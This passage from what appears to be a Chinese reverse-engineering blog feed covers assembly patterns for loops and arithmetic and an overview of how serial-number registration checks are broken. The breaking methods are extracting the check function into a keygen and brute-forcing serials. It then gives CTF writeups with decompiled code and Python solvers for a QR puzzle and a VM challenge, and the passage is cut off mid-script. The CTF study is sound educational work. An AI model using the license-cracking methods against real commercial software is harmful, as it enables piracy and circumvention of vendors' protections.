if</p><blockquote><p>无法使用case表的情况下，为减少if的判断次数，可能使用二叉平衡树来减少if判断次数</p></blockquote><h3 id="循环语句-1"><a href="#循环语句-1" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h4><p>先执行，后判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_while_start:&#123;; 代码&#125;cmp a, bjxx do_while_start</span><br></pre></td></tr></table></figure><p>通常有一个向上跳转</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><p>先判断，后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while_start:cmp a, bjxx while_end&#123;; 代码&#125;jmp while_startwhile_end:; 后续代码</span><br></pre></td></tr></table></figure><p>通常为一个向下的条件跳转，该目的地之前有一个向上的实跳转，跳转到向下跳转前</p><h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp for_iffor_step:  步长for_if:  循环条件jxx for_endfor 代码jmp for_stepfor_end:</span><br></pre></td></tr></table></figure><p>很常见的代码，比while循环多一个向下跳转</p><h3 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h3><h4 id="加减法-1"><a href="#加减法-1" class="headerlink" title="加减法"></a>加减法</h4><p>add和sub指令，可用lea指令进行优化</p><p>此外还有<strong>常量折叠</strong>的优化方法，即编译时提前完成常量间的计算，节省运行消耗的时间</p><h4 id="乘法-1"><a href="#乘法-1" class="headerlink" title="乘法"></a>乘法</h4><p>imul为有符号乘法，mul为无符号乘法</p><p>通常使用lea比例因子寻址优化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea edx, ds:0[rcx*4] ; *4imul edx, 7          ; *7lea edx, [rbc+rbc*8] ; *9</span><br></pre></td></tr></table></figure><h4 id="除法-1"><a href="#除法-1" class="headerlink" title="除法"></a>除法</h4><h5 id="有符号"><a href="#有符号" class="headerlink" title="有符号"></a>有符号</h5><p>除数为 $2^n$ 时，使用位移进行优化</p><p>除数为 $-2^n$ 时，使用位移，同时增加求补（x为负数时，计算 $-((x+(2^n-1))\gg n)$ ）</p><h4 id="取模"><a href="#取模" class="headerlink" title="取模"></a>取模</h4><h1 id="软件保护技术"><a href="#软件保护技术" class="headerlink" title="软件保护技术"></a>软件保护技术</h1><h2 id="序列号"><a href="#序列号" class="headerlink" title="序列号"></a>序列号</h2><p>序列号（注册码）的方式是目前最常见的一种保护</p><p>过程通常为：用户提交个人信息，公司计算得到序列号并返回给用户，用户通过序列号进行注册。软件从磁盘文件或注册表中获取注册信息</p><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><h4 id="本地计算用户信息并与序列号比较"><a href="#本地计算用户信息并与序列号比较" class="headerlink" title="本地计算用户信息并与序列号比较"></a>本地计算用户信息并与序列号比较</h4><p>即：$序列号=F(用户名)$</p><p>对于这种方式，可以直接使用调试的手段，在内存中直接找到计算后的序列号，同时，将F函数复制出即可生成注册机</p><h4 id="通过注册码求逆并与用户信息比较"><a href="#通过注册码求逆并与用户信息比较" class="headerlink" title="通过注册码求逆并与用户信息比较"></a>通过注册码求逆并与用户信息比较</h4><p>即：用公式 $序列号=F(用户名)$ 生成，用公式 $用户名=F^{-1}(序列号)$ 验证</p><p>破解方法有</p><ul><li>通过 $F^{-1}$ 求出 $F$</li><li>给定用户名，穷举序列号</li><li>给定序列号，用 $F^{-1}$ 计算出用户名（通常包含不可见字符）</li></ul><h4 id="对等函数检查"><a href="#对等函数检查" class="headerlink" title="对等函数检查"></a>对等函数检查</h4><p>即：$F_1(用户名)=F_2(序列号)$</p><p>通常 $F_2$ 可逆，借鉴上两种破解思路即可</p><h4 id="二元函数"><a href="#二元函数" class="headerlink" title="二元函数"></a>二元函数</h4><p>即：$特定值=F(用户名，序列号)$</p><p>缺陷在于可能缺少用户名与序列号的一一对应关系，开发者不易写出注册机</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;suibiankankan&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ部分RE（三）</title>
    <link href="https://s0uthwood.github.io/2021/08/19/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://s0uthwood.github.io/2021/08/19/BUUOJ%E9%83%A8%E5%88%86RE%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-08-19T11:11:32.000Z</published>
    <updated>2021-08-19T11:21:55.007Z</updated>
    
    <content type="html"><![CDATA[<p>suibianwanwan</p><ul><li>[FBCTF]go_get_the_flag</li><li>[Zer0pts2020]QR Puzzle</li><li>[XMAN2018排位赛]easyvm</li></ul><a id="more"></a><h1 id="FBCTF-go-get-the-flag"><a href="#FBCTF-go-get-the-flag" class="headerlink" title="[FBCTF]go_get_the_flag"></a>[FBCTF]go_get_the_flag</h1><p>没想到能在第五页见到memequal的题，真正的baby</p><h1 id="Zer0pts2020-QR-Puzzle"><a href="#Zer0pts2020-QR-Puzzle" class="headerlink" title="[Zer0pts2020]QR Puzzle"></a>[Zer0pts2020]QR Puzzle</h1><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>QR文件是25*25的字符串，每一位都是字符0或1</p><p>key文件每一行格式为 <code>a#(b,c)</code>，最后存储到链表中，末尾在前，具体结构为 <code>int b, int c, int a, 0, *next</code></p><h2 id="加密算法分析"><a href="#加密算法分析" class="headerlink" title="加密算法分析"></a>加密算法分析</h2><p>从加密函数来看，应该是一个vm</p><p>简单整理一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_400BD0</span><span class="params">(__int64 a1, <span class="keyword">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// r9</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er9</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( a2 ) &#123;</span><br><span class="line">    x = a2[<span class="number">2</span>];</span><br><span class="line">    y = a2[<span class="number">0</span>];</span><br><span class="line">    z = a2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">1</span> ) &#123;</span><br><span class="line">      v2 = z;</span><br><span class="line">      v3 = y + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">0</span> ) &#123;</span><br><span class="line">      v2 = z;</span><br><span class="line">      v3 = y - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">3</span> ) &#123;</span><br><span class="line">      v2 = z + <span class="number">1</span>;</span><br><span class="line">      v3 = y;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( x == <span class="number">2</span> ) &#123;</span><br><span class="line">      v2 = z - <span class="number">1</span>;</span><br><span class="line">      v3 = y;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">    v4 = &amp;a1[z];</span><br><span class="line">    v5 = &amp;a1[v2];</span><br><span class="line">    *(_BYTE *)(v7 + *v4) += *(_BYTE *)(*v5 + v3);</span><br><span class="line">    *(_BYTE *)(v3 + *v5) = *(_BYTE *)(*v4 + v7) - *(_BYTE *)(v3 + *v5);</span><br><span class="line">    *(_BYTE *)(*v4 + v7) -= *(_BYTE *)(*v5 + v3); <span class="comment">// 经典swap</span></span><br><span class="line">    a2 = (<span class="keyword">int</span> *)*((_QWORD *)a2 + <span class="number">2</span>);              <span class="comment">// a2 = a2-&gt;next</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然加密就是和周围某个位置交换一下</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>显然，解密和加密是对称的，直接把key文件反转过来，就是解密了</p><p>接下来需要把01串变成图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">black_block</span>(<span class="params">image, x, y</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                    image.putpixel((x + i, y + j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">125</span>, <span class="number">125</span>), <span class="string">&quot;#FFFFFF&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    <span class="string">&#x27;1111111001000101001111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001011001001001000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101001110011101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101001100010101011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011000111001011101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001001110111101000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111010101010101111111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000000101101100000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1010101000001110000010010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0011100010000110101001001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001001100011110111010011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1110110110001111000101000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0101001011011100011101011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0101100101111010101001011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001011011011000000100111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0101010010001110011110011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1001101001110010111111000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0000000011110000100011001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111001100101101010111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001001010001100010000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101011101000111111011&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101000111101000010000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1011101010111011010110101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1000001001001111111010010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1111111011110011100011011&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> flag[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    black_block(im, i * <span class="number">5</span>, j * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描二维码拿flag</p><h1 id="XMAN2018排位赛-easyvm"><a href="#XMAN2018排位赛-easyvm" class="headerlink" title="[XMAN2018排位赛]easyvm"></a>[XMAN2018排位赛]easyvm</h1><h2 id="读取字节"><a href="#读取字节" class="headerlink" title="读取字节"></a>读取字节</h2><p>vm题，上来先把字节翻译成汇编格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">vm_code = [</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x13</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, </span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x28</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x05</span>, </span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, </span><br><span class="line">    <span class="number">0x28</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0xE0</span>, </span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x18</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x03</span>, </span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x28</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, </span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, </span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x1F</span>, <span class="number">0x28</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x1F</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x28</span>, <span class="number">0x07</span>, </span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, </span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, </span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x13</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x28</span>, <span class="number">0x05</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, </span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, </span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0xDF</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x1D</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, </span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x17</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, </span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">length = <span class="built_in">len</span>(vm_code)</span><br><span class="line">inloop = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> index &lt; length:</span><br><span class="line">    v22 = vm_code[index]</span><br><span class="line">    v6 = vm_code[index + <span class="number">1</span>]</span><br><span class="line">    v5 = vm_code[index + <span class="number">2</span>]</span><br><span class="line">    v21 = vm_code[index] &amp; <span class="number">0xFE</span></span><br><span class="line">    v20 = vm_code[index] &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v21 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: mov v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: mov v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: mov32 v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: mov32 v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: lea_ch v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">            index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: lea_int v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: ldr_int v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0xA</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: ldr_ch v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0xC</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add v23[<span 